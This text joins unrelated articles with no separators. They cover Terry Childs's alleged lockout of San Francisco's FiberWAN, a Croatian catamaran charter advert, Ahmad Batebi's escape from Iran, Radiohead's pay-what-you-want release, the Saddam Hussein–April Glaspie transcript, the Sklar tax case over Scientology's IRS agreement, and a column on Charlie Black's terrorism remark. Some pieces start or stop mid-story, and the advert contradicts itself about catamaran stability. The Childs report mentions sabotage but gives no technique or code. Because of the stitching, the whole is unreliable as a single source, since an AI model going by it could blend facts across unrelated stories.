Prosecutors say Childs , who works in the Department of Technology at a base salary of just over $ 126,000 , tampered with the city 's new FiberWAN ( Wide Area Network ) , where records such as officials ' e-mails , city payroll files , confidential law enforcement documents and jail inmates ' bookings are stored .
Childs created a password that granted him exclusive access to the system , authorities said .
He initially gave pass codes to police , but they did n't work .
When pressed , Childs refused to divulge the real code even when threatened with arrest , they said .
He was taken into custody Sunday .
City officials said late Monday that they had made some headway into cracking his pass codes and regaining access to the system .
Childs has worked for the city for about five years .
One official with knowledge of the case said he had been disciplined on the job in recent months for poor performance and that his supervisors had tried to fire him .
" They were n't able to do it - this was kind of his insurance policy , " said the official , speaking on condition of anonymity because the attempted firing was a personnel matter .
Authorities say Childs began tampering with the computer system June 20 .
The damage is still being assessed , but authorities say undoing his denial of access to other system administrators could cost millions of dollars .
Officials also said they feared that although Childs is in jail , he may have enabled a third party to access the system by telephone or other electronic device and order the destruction of hundreds of thousands of sensitive documents .
Authorities have searched Childs ' home and car for a device that could be used in such an attack , but so far no such evidence has been found .
As part of his alleged sabotage , Childs engineered a tracing system to monitor what other administrators were saying and doing related to his personnel case , law enforcement officials said .
Childs became the target of suspicions inside the technology agency this year , and the case was referred for police investigation in late June , authorities say .
At a news conference announcing Childs ' arrest , District Attorney Kamala Harris was tightlipped about what his motive may have been .
" Motive is not necessarily an element of a crime , " Harris said .
" This city employee committed four felonies . "
She added , " This involves compromising a public system that we rely on .
Its integrity has been compromised . "
The system continues to operate even though administrators have limited or no access , officials said .
" Right now our system is up and running and we have n't had any problems so far , " said Ron Vinson , chief administrative officer for the Department of Technology .
Vinson said the city is " working around the clock " to make sure the system is maintained and operable .
Nathan Ballard , a spokesman for Mayor Gavin Newsom , said the mayor was " confident that ( the Department of Technology ) is doing everything necessary to maintain the integrity of the city 's computer networks . "
Childs appeared in court Monday but did not have a lawyer assigned to him .
Childs , according to payroll records , earned $ 126,735 in base pay in 2007 and additional premium pay of $ 22,534 , for a total of $ 149,269 .
Vinson said the extra money was apparently compensation for being on - call as a trouble - shooter .
Do you long for a little holiday in Croatia or simply want to know its surroundings and the coast ?
A sailboat for lease in Croatia is not suitable only for people who are engaged in sea sports or have a boat license .
If you already have some experience with sailing in Croatia and would like to try something new , then you can choose a catamaran .
Of course , you do n’t have to wait just for the summer to go on a trip with your family or friends .
The sailing season does not start or end in summer !
Why to choose a catamaran ?
The catamaran is especially popular due to its spaciousness .
It is suitable for young families with children , and also for sea and free sailing enthusiasts .
You will love this type of boat .
It consists of two connected hulls .
The catamaran has enough space to be fully utilized during the cruise .
The advantage of the choice is that you can opt for a motor catamaran or sail - powered catamaran .
How are the catamarans compared to sailboats ?
The catamaran differs significantly from the mono - hull boat .
Compared to sailboats , the catamaran can easily overturn in case of a strong wind because it has no weight .
A catamaran for rent in Croatia can also be a more cost - effective alternative if you want to experience adventurous sailing and explore the coast .
Is sailing at sea safe ?
The sailboat for lease in Croatia guarantees you a feeling of security since the boat is really stable .
In case you have little experience , it is really enough if you can learn the basics and proper maneuvering of the sailboat .
Usually , they sail at the same level , but catamarans can also lean significantly .
If you master the very basics , then you can enjoy real and undisturbed fun at sea that will bring you a new sense of freedom .
The longer the sailboat or catamaran is , the safer it is .
Such larger boats are offered by charter company www.LuxurySailing.eu.
After Mr. Batebi was rearrested in 2006 , the harshest treatment stopped .
But he was sometimes forced to watch his friends being tormented .
Last year , after Mr. Batebi suffered what was probably a stroke and several seizures , he was released for medical treatment .
In March , he was ordered to return to prison .
He knew that supporters wanted him to keep up the fight from behind bars , but he was worn out .
“ I could n’t do more than I had , ” he said .
“ Everyone needs a life . ”
An Underground Railroad
On a Yahoo chat site , on March 13 , Mr. Batebi contacted Ms. Mazahery , the lawyer , who he knew had helped other Iranians get into the United States .
At the same time , through a connection made in prison , Mr. Batebi sought help from the underground Kurdish Democratic Party of Iran , which soon directed him to Argentine Square in Tehran .
To his surprise , his Kurdish helpers  volunteers whose real names he never learned  said he had to leave immediately , taking advantage of the authorities ’ lax attention during the Iranian New Year holidays .
Carrying only a backpack containing his Dell laptop computer , a camera and a pocket - size video recorder , he retrieved some money from an A.T.M. and climbed into the strangers ’ car .
The next two days were a blur , he said , as he was driven in a series of cars on a circuitous route to the northwestern border with Iraq , a straight - line distance of about 300 miles .
Once , his ride was with a family .
Another time , it was with a mother and her baby .
A third time , he was directed to board a bus .
With many precautions , the Kurdish underground railroad moved him to the border  he will not say exactly where .
Then a new five - man team took over .
For a day and a half , with burros carrying supplies , they moved along the border , which was patrolled by guards and protected by land mines .
One of the escorts walked ahead to ensure that the way was clear , Mr. Batebi said .
Some musicians , record labels and a few others involved in the music industry are not happy at the moment .
Album sales are decreasing and new records are leaking like a broken faucet that has n’t been fixed in months .
One major concern that ’s causing artists to angrily cry out is the marketing plan other musicians have adopted .
The “ pay what you want ” scheme is said to be damaging the music industry and with more artists using this strategy , the situation is just going to get worse .
However , this proclamation could just be a false assumption .
The Beginning Of Something Different
The whole outcry started in October 2007 , when Radiohead , the innovative rock band from England , announced the release of their album .
As far as releases go , there ’s nothing really surprising .
People rush to record stores on the release date and try to get their hands on a copy before it ’s out of stock .
But instead of sticking to tradition , Radiohead went digital on us .
Their new album , titled In Rainbows , was released as a digital download where customers could choose their own price .
The “ pay what you want ” sales alternative was featured on the website for the CD and messages promptly stated that the album could be bought for any price .
Purchasing it for free was even acceptable .
With no retail price and no record label , the strategy was seen by other musicians as a failure and even a disgrace .
Even Gene Simmons , bassist for the rock band KISS , took a shot at the British musicians .
Simmons stated that their marketing strategy was contributing to the demise of the music industry and was influencing fans to download music and file share even more .
Despite the criticisms ,
In Rainbows was a huge success .
When the album was physically released , it charted at number one in both the UK and the U.S.
The record ’s success in the U.S. marked their highest chart placement since their album Kid A , that was released in 2000 .
The new album also received astonishing reviews .
Rolling Stone surprisingly gave the album a rating of four and a half stars .
The Influence On Others
With such great success , the album and marketing strategy became a major influence on other musicians .
Trent Reznor , the lead singer of Nine Inch Nails , followed suit with the “ pay what you want ” idea .
The band released several albums where tracks could be downloaded for free or bought for a certain price .
The interesting thing to note is that Trent Reznor recorded , and distributed the album Ghost I - IV without any record company involvement .
Younger bands are even hopping aboard the “ pay what you want ” train .
Just recently , musician Greg Gillis released an album under the name Girl Talk , for no set price .
On the download site , customers can download the album for free , for $ 5 in the form of FLAC files or for $ 10 , ultimately giving you all of the above and a packaged CD when it comes out .
This is just an example of how the marketing strategy is influencing younger musicians .
Some bands have stated that they might not be creating albums anymore .
Instead , they ’d rather release music singles as digital downloads .
Is " Free " Really That Bad ?
Despite all the criticisms , the “ pay what you want ” strategy might be good after all .
They can affect record stores in a negative way , but as we ’ve seen with Radiohead , it could be positive .
Even though most people who use the strategy purchase albums for free , it does n’t mean that they wo n’t physically buy the album in the near future .
One ca n’t forget about the diehard fans that are also willing to spend $ 20 or more on a digital download .
The marketing strategy is affecting the music industry , but it ’s like most of the technology today .
DVD ’s have ultimately taken over VHS tapes and even CD ’s dominated cassette tapes at one point in time .
File sharing and downloading is hurting the music industry , but until record stores start going bankrupt , the musicians who are making criticisms are just crying wolf .

Eighteen years ago , the infamous meeting between Saddam Hussein and April Glaspie took place .
Most people only recall that April Glaspie , in her ambiguity , may have given Saddam a " green light " to enter Kuwait .
But , there was much more to the meeting than this oft - told allegation .
Saddam let Glaspie know that he and his government were well aware that the U.S. and Kuwait were attempting to undermine Iraq�s economy .
Hindsight shows us today that this meeting dealt with many issues that were involved in the U.S. aggression against Iraq , not just the border problem with Kuwait .
Here is another interesting aspect of this conversation .
Today , the U.S. public is complaining about gasoline prices , yet Saddam Hussein told April Glaspie that $ 25 a barrel was an equitable price and that some of his Arab counterparts wanted to increase the price .
In 2003 , the U.S. public was told that Iraq had to be invaded to ensure the flow of oil from the Middle East .
Just the opposite was true .
Transcript of the meeting between Saddam Hussein and U.S. Ambassador to Iraq , April Glaspie , July 25 , 1990 Saddam Hussein : I have summoned you today to hold comprehensive political discussions with you .
This is a message to President Bush .
You know that we did not have relations with the U.S. until 1984 and you know the circumstances and reasons which caused them to be severed .
The decision to establish relations with the U.S. was taken in 1980 during the two months prior to the war between us and Iran .
When the war started , and to avoid misinterpretation , we postponed the establishment of relations hoping that the war would end soon .
But because the war lasted for a long time , and to emphasize the fact that we are a nonaligned country , it was important to re-establish relations with the U.S .
And we chose to do this in 1984 .
It is natural to say that the U.S. is not like Britain , for example , with the latter�s historic relations with Middle Eastern countries , including Iraq .
In addition , there were no relations between Iraq and the U.S. between 1967 and 1984 .
One can conclude it would be difficult for the U.S. to have a full understanding of many matters in Iraq .
When relations were re-established , we hoped for a better understanding and for better cooperation because we too do not understand the background of many American decisions .
We dealt with each other during the war and we had dealings on various levels .
The most important of these levels were with the foreign ministers .
We had hoped for a better common understanding and a better chance of cooperation to benefit both our peoples and the rest of the Arab nations .
But these better relations have suffered from various rifts .
The worst of them was in 1986 , only two years after establishing relations , with what was known as Irangate , which happened during the year that Iran occupied the Fao peninsula .
It was natural then to say that old relations and complexity of interests could absorb many mistakes .
But when interests are limited and relations are not that old , then there is n�t a deep understanding and mistakes could leave a negative effect .
Sometimes the effect of an error can be larger than the error itself .
Despite all of that , we accepted the apology , via his envoy , of the American president regarding Irangate , and we wiped the slate clean .
And we shouldn�t unearth the past except , when new events remind us that old mistakes were not just a matter of coincidence .
Our suspicions increased after we liberated the Fao peninsula .
The media began to invoke itself in our politics .
And our suspicions began to surface anew , because we began to question whether the U.S. felt uneasy with the outcome of the war when we liberated our land .
It was clear to us that certain parties in the United States � and I don�t say the president himself � but certain parties who had links with the intelligence community and with the State Department � and I don�t say the Secretary of State himself �
I say that these parties did not like the fact that we liberated our land .
Some parties began to prepare studies entitled , " Who will succeed Saddam Hussein ? "
They began to contact Gulf states and make them fear Iraq , to persuade them not to give Iraq economic aid .
And we have evidence of these activities .
Iraq came out of the war burdened with $ 40 billion debts , excluding the aid given by Arab states , some of whom consider that too to be a debt although they knew � and you knew too � that without Iraq they would not have had these sums and the future of the region would have been entirely different .
We began to face the policy of the drop on the price of oil .
Then we saw the United States , which always talks of democracy but which has no time for the other point of view .
Then the media campaign against Saddam Hussein was started by the official American media .
The United States thought that the situation in Iraq was like Poland , Romania or Czechoslovakia .
We were disturbed by this campaign , but we were not disturbed too much because we had hoped that , in a few months , those who are decision makers in America would have a chance to find the facts and see whether this media campaign had had any effect on the lives of Iraqis .
We had hoped that soon the American authorities would make the correct decision regarding their relations with Iraq .
Those with good relations can sometimes afford to disagree .
But when planned and deliberate policy forces the price of oil down without good commercial reasons , then that means another war against Iraq .
Because military war kills people by bleeding them , and economic war kills their humanity by depriving them of their chance to have a good standard of living .
As you know , we gave rivers of blood in a war that lasted eight years , but we did not lose our humanity .
Iraqis have a right to live proudly .
We do not accept that anyone could injure Iraqi pride or the Iraqi right to have high standards of living .
Kuwait and the U.A.E. were at the front of this policy aimed at lowering Iraq�s position and depriving its people of higher economic standards .
And you know that our relations with the Emirates and Kuwait had been good .
On top of that , while we were busy at war , the state of Kuwait began to expand at the expense of our territory .
You may say this is propaganda , but I would direct you to one document , the Military Patrol Line , which is the borderline endorsed by the Arab League in 1961 for military patrols not to cross the Iraq - Kuwait border .
But go and look for yourselves .
You will see the Kuwaiti border patrols , the Kuwaiti farms , the Kuwaiti oil installations � all built as closely as possible to this line to establish that land as Kuwaiti territory .
Since then , the Kuwaiti government has been stable while the Iraqi government has undergone many changes .
Even after 1968 and for 10 years afterwards , we were too busy with our own problems .
First in the north then the 1973 war , and other problems .
Then came the war with Iran which started 10 years ago .
We believe that the United States must understand that people who live in luxury and economic security can reach an understanding with the United States on what are legitimately joint interests .
But the starved and the economically deprived cannot reach the same understanding .
We do not accept threats from anyone because we do not threaten anyone .
But we say clearly that we hope that the U.S. will not entertain too many illusions and will seek new friends rather than increase the number of its enemies .
I have read the American statements speaking of friends in the area .
Of course , it is the right of everyone to choose their friends .
We can have no objections .
But you know you are not the ones who protected our friends during the war with Iran .
I assure you , had the Iranians overrun the region , the American troops would not have stopped them , except by the use of nuclear weapons .
I do not belittle you .
But I hold this view by looking at the geography and nature of American society into account .
Yours is a society which cannot accept 10,000 deaths in one battle .
You know that Iran agreed to the cease - fire not because the United States had bombed one of the oil platforms after the liberation of the Fao .
Is this Iraq�s reward for its role in securing the stability of the region and for protecting it from an unknown flood ?
So what can it mean when America says it will not protect its friends ?
It can only mean prejudice against Iraq .
This stance , plus maneuvers and statements which have been made , has encouraged the U.A.E. and Kuwait to disregard Iraqi rights .
I say to you clearly that Iraq�s rights , which are mentioned in the memorandum , we will take one by one .
That might not happen now or after a month or after one year , but we will take it all .
We are not the kind of people who will relinquish our rights .
There is no historic right , or legitimacy , or need , for the U.A.E. and Kuwait to deprive us of our rights .
If they are needy , we too are needy .
The United States wants to secure the flow of oil .
This is understandable and known .
But it must not deploy methods which the United States says it disapproves of ; flexing muscles and pressure .
If you use pressure , we will deploy pressure and force .
We know that you can harm us although we do not threaten you .
But we too can harm you .
Everyone can cause harm according to their ability and their size .
We cannot come all the way to you in the United States , but individual Arabs may reach you .
You can come to Iraq with aircraft and missiles , but do not push us to the point where we cease to care .
And when we feel that you want to injure our pride and take away the Iraqis� chance of a high standard of living , then we will cease to care and death will be the choice for us .
Then we would not care if you fired 100 missiles for each missile we fired .
Because without pride , life would have no value .
It is not reasonable to ask our people to bleed rivers of blood for eight years then to tell them , " Now you have to accept aggression from Kuwait , the U.A.E. , or from the U.S. or Israel . "
We do not put all these countries in the same boat .
First , we are hurt and upset that such disagreement is taking place between us and Kuwait and the U.A.E .
The solution must be found within an Arab framework and through direct bilateral relations .
We do not place America among the enemies .
We place it where we want our friends to be and we try to befriends .
But repeated American statements last year made it apparent that America did not regard us as friends .
When we seek friendship , we want pride , liberty and our right to choose .
We want to deal according to our status as we deal with the others according to their status .
We consider the others� interests while we look after our own .
And we expect the others to consider our interests while they are dealing with their own .
What does it mean when the Zionist war minister is summoned to the United States now ?
What do they mean , these fiery statements coming out of Israel during the past few days and the talk of war being expected now more than at any other time ?
I do not believe that anyone would lose by making friends with Iraq .
In my opinion , the American president has not made mistakes regarding the Arabs , although his decision to freeze dialogue with the PLO was wrong .
But it appears that this decision was made to appease the Zionist lobby or a piece of strategy to cool the Zionist anger , before trying again .
I hope that our latter conclusion is the correct one .
But we will carry on saying it was the wrong decision .
You are appeasing the usurper in so many ways : economically , politically and militarily as well as in the media .
When will the time come when , for every three appeasements to the usurper , you praise the Arabs just once ?
April Glaspie : I thank you , Mr. President , and I as a great pleasure for a diplomat to meet and talk directly with the President .
But with your permission , I will comment on two points .
You spoke of friendship and I believe it was clear from the letters sent by our president to you on the occasion of your National Day that he emphasizes � Saddam Hussein :
He was kind and his expressions met with our regard and respect .
April Glaspie :
As you know , he directed the United States administration to reject the suggestion of implementing trade sanctions .
Saddam Hussein :
There is nothing for us to buy from America .
Only wheat .
Because every time we want to buy something , they say it is forbidden .
I am afraid that one day you will say , " You are going to make gunpowder out of wheat . "
April Glaspie : I have a direct instruction from the president to seek better relations with Iraq .
Saddam Hussein : But how ?
We too have this desire .
But matters are running contrary to this desire .
April Glaspie :
This is less likely to happen the more we talk .
For example , you mentioned the issue of the article published by the American Information Agency and that was sad .
And a formal apology was presented .
Saddam Hussein : Your stance is generous .
We are Arabs .
It is enough for us that someone says , " I am sorry .
I made a mistake . "
Then we carry on .
but the media campaign continued .
And it is full of stories .
If the stories were true , no one would get upset .
But we understand from its continuation that there is a determination .
April Glaspie : I saw the Diane Sawyer program on ABC .
And what happened in that program was cheap and unjust .
And this is a real picture of what happens in the American media ; even to American politicians themselves .
These are the methods the Western media employs .
I am pleased that you add your voice to the diplomats who stand up to the media .
Because your appearance in the media , even for five minutes , would help us to make the American people understand Iraq .
This would increase mutual understanding .
If the American president had control of the media , his job would be much easier .
Mr. President , not only do I want to say that President Bush wanted better and deeper relations with Iraq , but he also wants an Iraqi contribution to peace and prosperity in the Middle East .
President Bush is an intelligent man .
He is not going to declare an economic war against Iraq .
You are right .
It is true what you say that we do not want higher prices for oil .
But I would ask you to examine the possibility of not charging too high a price for oil .
Saddam Hussein :
We do not want too high prices for oil .
And I remind you that in 1974 I gave Tariq
Aziz the idea for an article he wrote which criticized the policy of keeping oil prices high .
It was the first Arab article which expressed this view .
Tariq Aziz : Our policy in OPEC opposes sudden jumps in oil prices .
Saddam Hussein :
Twenty - five dollars a barrel is not a high price .
April Glaspie :
We have many Americans who would like to see the price go above $ 25 because they come from oil - producing states .
Saddam Hussein :
The price at one stage had dropped to $ 12 a barrel and a reduction in the modest Iraqi budget of $ 6 billion to $ 7 billion is a disaster .
April Glaspie : I think I understand this .
I have lived here for years .
I admire your extraordinary efforts to rebuild your country .
I know you need funds .
We understand that and our opinion is that you should have this opportunity to rebuild your country .
But we have no opinion on the Arab - Arab conflicts , like your border disagreement with Kuwait .
I was in the American Embassy in Kuwait during the late 60s .
The instruction we had during this period was that we should express no opinion on this issue and that the issue is not associated with America .
James Baker has directed our official spokesmen to emphasize this instruction .
We hope you can solve this problem using any suitable methods via Klibi or via President Mubarak .
All that we hope is that these issues are resolved quickly .
With regard to all of this , can I ask you to see how the issue appears to us ?
My assessment after 25 years � service in this area is that your objective must have strong backing from your Arab brothers .
I now speak of oil .
But you , Mr. President , have fought through a horrific and painful war .
Frankly , we can only see that you have deployed massive troops in the south .
Normally that would not be any of our business .
But when we read the details in the two letters of the foreign minister , then when we see the Iraqi point of view that the measures taken by the U.A.E. and Kuwaitis is , in the final analysis , parallel to military aggression against Iraq , then it would be reasonable for me to be concerned .
And for this reason , I received an instruction to ask you , in the spirit of friendship , not in the spirit of confrontation , regarding your intentions .
I simply describe the concern of my government .
And I do not mean that the situation is a simple situation .
But our concern is a simple one .
Saddam Hussein :
We do not ask people not to be concerned when peace is at issue .
This is a noble human feeling which we all feel .
It is natural for you as a superpower to be concerned .
But what we ask is not to express your concern in a way that would make an aggressor believe that he is getting support for his aggression .
We want to find a just solution which will give us our rights but not deprive others of their rights .
But at the same time , we want the others to know that our patience is running out regarding their action , which is harming even the milk our children drink , and the pensions of the widow who lost her husband during the war , and the pensions of the orphans who lost their parents .
As a country , we have the right to prosper .
We lost so many opportunities , and the others should value the Iraqi role in their protection .
Even this Iraqi ( the president points to the interpreter ) feels bitter like all other Iraqis .
We are not aggressors , but we do not accept aggression either .
We sent them envoys and handwritten letters .
We tried everything .
We asked the Servant of the Two Shrines , King Fahd , to hold a four - member summit , but he suggested a meeting between the oil ministers .
We agreed .
And as you know , the meeting took place in Jidda .
They reached an agreement which did not express what we wanted , but we agreed .
Only two days after the meeting , the Kuwaiti oil minister made a statement that contradicted the agreement .
We also discussed the issue during the Baghdad summit .
I told the Arab kings and presidents that some brothers are fighting an economic war against us .
And that not all wars use weapons and we regard this kind of war as a military action against us .
Because if the capability of our army is lowered then , if Iran renewed the war , it could achieve goals which it could not achieve before .
And if we lowered the standard of our defenses , then this could encourage Israel to attack us .
I said that before the Arab kings and presidents .
Only I did not mention Kuwait and the U.A.E. by name , because they were my guests .
Before this , I had sent them envoys reminding them that our war had included their defense .
Therefore , the aid they gave us should not be regarded as a debt .
We did no more than the United States would have done against someone who attacked its interests .
I talked about the same thing with a number of other Arab states .
I explained the situation to brother King Fahd a few times by sending envoys and on the telephone .
I talked with brother King Hussein and with Sheik Zaid after the conclusion of the summit .
I walked with the Sheik to the plane when he was leaving Mosul .
He told me , " Just wait until I get home . "
But after he had reached his destination , the statements that came from there were very bad � not from him , but from his minister of oil .
Also after the Jidda agreement , we received some intelligence that they were talking of sticking to the agreement for two months only .
Then they would change their policy .
Now tell us , if the American president found himself in this situation , what would he do ?
I said it was very difficult for me to talk about these issues in public .
But we must tell the Iraqi people who face economic difficulties who was responsible for that .
Will Sklar II crack open Scientology ’s Secret Agreement with the IRS ?
In the early 1990s , Michael and Marla Sklar deducted part of their children ’s school tuition from their income tax in an amount equal to the proportion they viewed their tuition going toward religious instruction , as opposed to secular teaching ( e.g. , math , english ) .
He listed his deductions under section 170 of the Tax Code , which permits deductions for charitable and religious contributions .
The IRS denied the Sklars their deduction , noting that the Sklars had not provided receipts from the Church of Scientology .
Scientologists are permitted to deduct ( hefty ) payments for auditing because Scientology and the IRS agreed to view payments for auditing as “ donations . ”
The IRS and Scientology did n’t always agree on this , however — in fact , a U.S. Supreme Court case , Hernandez v. Commissioner , 490 U.S. 680 ( 1989 ) , explicitly held that payments made by Scientologists for auditing were not deductible charitable contributions under section 170 , because they were , in essence and structure , quid pro quo transactions .
Prices for auditing services were fixed by the organization , which refunded payments if the auditing services went unperformed , the court noted .
Despite the IRS ’s win over Scientology in 1989 , Hernandez was not the only lawsuit Scientology was bringing against the IRS , and the IRS eventually relented and “ settled ” with the Church of Scientology ( see Chris Owen compendium for more ) , which ceased all ongoing litigation against the IRS , and made a payment of $ 12.5 million ( there were other details to the settlement , which is best summarized in this WSJ article ) .
“ The IRS normally settles on tax issues alone , ” said Robert Fink , a New York tax lawyer who reviewed the agreement .
“ What the IRS wanted was to buy peace from the Scientologists .
You never see the IRS wanting to buy peace . ”
Although the agreement was reached in 1993 , it did n’t come to light until 1997 , when someone within the IRS leaked it to the Wall Street Journal , which published it in its entirety .
Since then , neither the IRS nor Scientology has ever confirmed its veracity , but the parties have n’t denied it , either .
( As an aside , Alison Eaton asked a compelling , somewhat related question in a 1996 law review article — Can the IRS overrule the Supreme Court ?
See 45 Emory L.J. 987 ( 1996 ) . )
In light of the above , the Sklars argued that the IRS ’s disparate treatment of Scientology was an establishment clause violation — the First Amendment prohibits the government from preferring any one religion over another .
The Ninth Circuit ( the Sklars appealed after losing at the Tax Court level ) agreed with the Sklars insofar as there was an establishment clause violation , but declined to grant them their desired remedy .
The cure to the Constitutional problem , they said , was not to give everyone what the Scientologists were getting , but to rescind any such unconstitutional privilege .
“ The remedy is not to require the IRS to let others claim the improper deduction , too , ” Judge Barry G. Silverman wrote .
But then he went on to say :
“ If the IRS does , in fact , give preferential treatment to members of the Church of Scientology — allowing them a special right to claim deductions that are contrary to law and disallowed to everybody else — then the proper course of action is a lawsuit to put a stop to that policy . ”
Unfortunately , this is nearly impossible , as few , if any , taxpayers have standing to bring such a suit , especially after the Supreme Court ’s recent narrowing of the Flast ( 392 US 83 ) doctrine , in Hein ( 433 F.3d 989 ) .
I ’ll refrain from dragging this post down with a discussion of standing , but there ’s more here and here as to why it ’s effectively impossible for any person to bring a lawsuit against the IRS to rescind its unconstitutional agreement with Scientology .
Despite losing their appeal , the Sklars were n’t finished — they attempted the same type of deduction in consecutive years , so a second lawsuit was triggered by the subsequent denial , and the Sklars were back before the Ninth Circuit on February 4 of this year ( I ’ll refer to this case as Sklar II ) .
The lower court quashed the Sklars ’ attempts to subpoena Scientology for the secret agreement and other materials , so the oral arguments ( which can be heard here and which is nicely summarized by the NY Sun here ) , were mainly about the IRS - Scientology secret agreement , and there were some encouraging signs .
As noted above , because neither Scientology nor the IRS have admitted to the veracity of the secret agreement published by the Wall St. Journal , the Tax Court has not allowed the agreement into evidence .
And because the secret agreement is necessary for the Sklars to be able to make their disparate treatment argument — i.e. , the Sklars must be permitted to deduct religious school tuition to remedy the IRS ’s preferential treatment of Scientology — the secret agreement , they argue , must be disclosed .
The IRS has a few responses to this argument .
First , the type of religious training Scientologists are permitted to deduct ( payments for auditing ) is different than religious training that goes on in private schools .
But as Ninth Circuit Judge Wardlaw asked IRS attorney Ellen Delsole , “ How do we know that ? ”
The IRS ’s argument relies on interpreting an agreement they wo n’t acknowledge exists , but admits to having read in the Wall Street Journal .
“ You tell us you do n’t know anything of it , but you read the Wall Street Journal , ” Judge Pregerson incredulously ponders .
Second , the IRS argues , the secret agreement is a settlement document between the IRS and private individual Scientologists , and to disclose the agreement would violate the privacy of those individuals ( specifically , section 6103 of the Tax Code ) .
This is also preposterous , because — assuming the secret agreement published by the WSJ is accurate , and there ’s no reason to think it ’s not — the individual taxpayers at issue are barely even addressed in the secret agreement .
The settlement agreement largely addresses the restructuring of the Scientology corporate maze , its front groups , and so on .
Plus , as Judge Wardlaw pointed out , judges have an array of tools to cure any privacy issues related to individuals — the document could be partially redacted , held under seal , etc .
Third ( and this is really their only marginally valid argument ) , the Ninth Circuit in Sklar I already recognized the unfairness of the preferential treatment Scientology is apparently receiving , but that fact — true or not — does not alter the outcome of the Sklars ’ request , whose outcome is determined by prior case law , most notably United States v. American Bar Endowment , 477 U.S. 105 ( 1986 ) , and Hernandez .
( That ’s right :
The same Hernandez decision that categorically barred Scientologists from deducting auditing payments , if you can wrap your head around that irony . )
“ That ’s your best argument : two wrongs do n’t make a right , ” remarked Judge Ronald Leighton ( Western District of Washington , sitting by designation ) .
But Judge Wardlaw openly questioned how the tax court could possibly know the outcome without considering Sklars ’ argument in light of disclosed secret agreement , and may have tipped her hand when she said , “ I think that ’s what we ’re going to have to do [ remand with instructions to disclose ] . ”
The IRS also offered a weak administrative nightmare argument — the IRS would be forced to answer to other taxpayers who might want the same deal the Scientologists are getting .
The Sklars ’ lawyer , Jeffrey Zuckerman , ably dismissed this argument : “ If the IRS were saying white people were entitled to a certain deduction and black people were not , why would it be such a parade of horrors for the courts to come in and say the government may not act that way ? ”
It ’s usually not possible to determine how a case is going to go based on oral arguments and the questions that judges ask , but one moment in the February 4 oral argument stood out to me as a “ very good indicator , ” to borrow a Scientology term of art .
Judge Wardlaw : “ The view of the IRS is it can unconstitutionally violate the Constitution by establishing religion , by treating one religion more favorably than other religions in terms of what is allowed as deductions , and there can never be any judicial review of that ? ”
IRS ( Delsole ) : “ That is not at all what I said . ”
Judges Pregerson & Wardlaw ( simultaneously ) : “ That ’s the bottom line ! ”
Judge Wardlaw : “ This does intrude into the Establishment Clause . ”
It ’ll be four months since those arguments next week , and an opinion should be issued soon .
It seems entirely possible that the Ninth Circuit will remand with instructions to force the IRS to disclose the secret agreement so that the Sklars can make their disparate treatment argument .
I suspect it wo n’t do Sklar any good , as the type of deduction he seeks is the type instituted by Congress , not via some loophole left open by an IRS settlement with Scientology , as patently unfair as that settlement agreement is and might be .
But what it would do is make the secret agreement “ fair game , ” to borrow another term all - too - familiar to Scientology .
Disclosure of the agreement does n’t solve the standing problem ( see above ) , but it does brighten a dark and ugly secret that both the IRS and Scientology wish to keep dark .
Everyone seems to agree that Charlie Black , the McCain campaign advisor who told Fortune magazine that a terrorist attack between now and election day would help his candidate , spoke the truth .
An impolitic and impolite truth , perhaps , one that visited some grief upon his candidate , who had to denounce the remark , but the truth all the same .
I say : not necessarily .
My argument has nothing to do with the merits or lack thereof of Barack Obama as anti-terrorist warrior .
Obama can't beat John McCain on the terrorist - fighting barometer .
A poll out this week gave McCain a 14 percentage - point edge over Obama on the issue among independents .
The best Obama can probably do is chip that down to 10 points or lower and count on his massive leads on domestic questions and his draw with McCain on Iraq to see him through .
My argument , rather , has to do with the reaction of the people , with the standing of the Bush administration , and with how the media might deal with a new attack .
It begins with this question :
If the United States were attacked again this fall , would the response be essentially identical to the response to September 11 , 2001 ?
Black 's statement - and the conventional wisdom that has congealed around the idea that Black was expressing an unutterable truth - assumes that it will be .
The assumption is that the nation will be shocked and will rally around its president , and that the media will respond to another attack in much the same way it did to 9/11 .
I 'm not sure any of those things is true .
Of course , the people will be shocked .
But it 's a general rule that the second time is never the same as the first time .
This all depends to some extent on the nature of the attack .
Since it 's thought to be in bad taste to speculate on the precise nature of such things , I wo n't do it .
But let 's just say that , since 9/11 , some percentage of the collective American mind is conditioned now to expect that we might be hit again .
It probably wo n't be quite the shock that the first one was .
I 'm not counting the World Trade Center bombing of 1993 because that was largely botched – it was planned to be far more devastating – and did n't hammer itself into American consciousness the way 9/11 did .
Now , let 's consider the state of the Bush administration and the possible media response , which are intertwined .
In September 2001 , Bush still had credibility .
True , he was not overwhelmingly popular .
On September 10 , Bush had a 52 % approval rating – far from gaudy , although a number he'd kill for now .
But he'd been president only eight months , and most Americans had n't yet grasped the degree of willful ignorance and ideological rigidity that governed his thinking .
The level of shock and the goodwill accorded Bush at the time – we needed a leader , a Churchill , all that – combined to ensure that Bush could set the terms of the fight against this new menace virtually unfettered .
That , in retrospect , was a tragic development ( actually , some of us knew at the time it was a tragic development , but there was little to be done about it ) .
But it was impossible at the time to challenge that view and gain any traction in the mainstream .
Which leads us to the media .
The media , taking their cues from public opinion and from some among its number who had an ideological interest in seeing Bush transformed into Churchill ( i.e. the Murdoch - owned media ) , simply refused to ask any questions for nearly a year .
It was May 2002 before the US media – Newsweek , most notably , in a tough package of cover stories that I remarked on at the time – began to ask difficult questions about what the Bush administration knew before 9/11 and what it might have done to prevent the attacks .
That issue of Newsweek faded into the woodwork , and the media – including Newsweek itself – set up the bowling pins for the march into Iraq .
Would they do the same this time ?
I 'm not so sure .
There would be a period of national unity , of insisting that politics stops " at the water 's edge , " in which even Obama would be obliged to participate .
But I suspect that this time around it would be a matter of days or at best weeks , certainly not months , before the country 's best investigative and intelligence reporters – Sy Hersh , Mike Isikoff , Mark Hosenball , Eric Lichtblau , James Risen , Dana Priest and a handful of others – would start turning over rocks .
And this time , their editors would let them roam .
Also , this time , Democrats in Congress would stand up and ask some questions .
They were cowardly in the extreme in 2001 – to their eternal shame .
But politicians are quite adept at kicking a man while he 's down .
A president with a 29 % approval rating , in whom most of America has lost confidence , is n't very scary , even after a terrorist attack – that might take him up to , say , the old 52 % ?
McCain , as I said , would have an advantage over Obama mano a mano .
That 's a given .
And it may be that the fear factor would move meaningful percentages of voters in swing states over to McCain .
But suppose the context of a second attack were that it did n't carry the shock that 9/11 did , that the Bush administration could not assert without explaining as it was able to do back then , and that the media did some reporting and demonstrated that Bush and his officials should have been more on the ball ?
That just does n't strike me as a far - fetched scenario .
